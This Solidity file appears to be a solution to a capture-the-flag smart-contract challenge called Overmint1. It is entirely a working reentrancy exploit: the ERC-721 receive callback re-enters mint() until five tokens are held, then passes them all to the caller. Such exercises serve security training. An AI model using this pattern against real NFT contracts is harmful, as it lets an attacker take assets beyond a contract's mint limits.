// SPDX-License-Identifier: MIT
pragma solidity 0.8.15;

import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721.sol";

interface IOvermint1 {
    function mint() external;

    function success(address _attacker) external view returns (bool);
}

contract Overmint1Attacker is IERC721Receiver {
    address public victim;
    uint256[] private _tokenIds;

    constructor(address _victim) {
        victim = _victim;
    }

    function onERC721Received(
        address /* operator */,
        address /* from */,
        uint256 tokenId,
        bytes calldata /* data */
    ) external override returns (bytes4) {
        _tokenIds.push(tokenId);
        if (IERC721(victim).balanceOf(address(this)) < 5) IOvermint1(victim).mint();
        return IERC721Receiver.onERC721Received.selector;
    }

    function attack() external {
        IOvermint1(victim).mint();
        require(IOvermint1(victim).success(address(this)), "unsuccessful attack");
        for (uint256 i; i < _tokenIds.length; ) {
            IERC721(victim).safeTransferFrom(address(this), msg.sender, _tokenIds[i]);
            unchecked {
                ++i;
            }
        }
    }
}
